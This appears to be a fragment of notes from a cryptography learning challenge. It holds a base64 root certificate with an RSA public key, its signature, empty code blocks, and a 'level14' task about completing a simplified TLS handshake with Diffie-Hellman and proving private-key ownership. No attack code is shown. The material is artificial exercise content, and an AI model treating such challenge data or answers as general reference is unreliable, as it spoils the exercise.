root certificate (b64): eyJuYW1lIjogInJvb3QiLCAia2V5IjogeyJlIjogNjU1MzcsICJuIjogMjI1MzQ5OTA0NTk4MjI5ODEzNTk5NjE3Mjk5MjEyODY1MzA0MDcxODY3NzU2MjgyNDk1NTIxOTg1MjM3NTczNjgwOTAyMDcwMzMxMTIyOTQ2MzgxNDAyNTEyNzIwMTgwNTk4MzI1ODk3OTA0NjgxMDM2Mzc4Njg4MDY4NzAzMDU0OTY0NzQwODg0NDA2ODQxNTk0MjU4NDE4MjcxNDA1MDAwMTQxMjYzOTg4NDgyMjcyOTk5MTE4MTUxNTc5NTYyODY2MDM3MDczNzAxNTIwMDc0Njg4MDIzNDA3NjA0MTA1NDAwNDQ4MTM4NTI2NjM4NzY0MTAxNTk0OTc4NDg0MTg5NjMxMjk3MTA0MTY4NzQ5MzEyNjk5OTIyNjgyODA2ODg3Mjc0NTk1MzkwNzIxOTUyMzc5NDM1Mzk2NDgzMjc3MTc4MTkzNzEyNDQ0NDE4MjU3MDIwNDU1MTU0NjU3MDg1MTE0NDA4NTc0MDk5NTAxMzI2MDYxMjg2MzA1MzU4ODI5NDAzMTM5NDQ1ODU0NTE3NDk4ODUyNjUyNTY1NDIzNTA3OTgxNjI3NjE3OTk2MDEyNTE4OTY0NTMxNzY3OTMyNDkwODg5NDQ3NDQ5Mjg0Mzc1ODQzNTQzMjA1MTIxNTA2MjExNDkyODQ0NTI3NTQzNjkwMDE0NTM1NzgxMTk4ODY2NTAyODQ4Njk0ODM5MzU0NDQ0NzMxNTYxODE5OTc4Mjg0MjE1NTIyMjAwMjY4NTM4NzYwNjM0NDY4MDY3NzY1NDY2NTU1MTkyMDYxNDgwODE5MTEzMTkwMTU3MjMyODIzNTA4OTl9LCAic2lnbmVyIjogInJvb3QifQ==
root certificate signature (b64): hwsElNfFo99DurQ2y8BlPfwPf3kVk6EPNjQntqm1avvysj4/2nLvzISC0NilKnV7K9H8X56w/GpkR6lHTodnZn7veHL5IyP3Bt9Q7jkw5NYQVtZt1z41klY2S2xd4j4YcGcP8M5VNJQQHqFBLXvIIQIRBdKt3HRw0GfSQZhPGgYJ1rUdPY/UDRRNTlaSW9gNZVJm2qJ4jW+I0/WC3YkVg3eNOgaljU6pdvbfl5T0cyHuvD22fgECSaZYxhtOfZX6TS/SOCXf8FVIuMbA202xsgtaVbfjgIbubAXQjZPT09Il8+t4f9D8N/6yx9Iq9/nGuBqCmexqqmy8McEnzfBaSg==
user certificate (b64):
```

```python

```

#### level14
> Perform a simplified TLS handshake as the server, completing a Diffie-Hellman key exchange and establishing an encrypted channel to provide a user certificate and prove private key ownership

```shell

```

```python

```
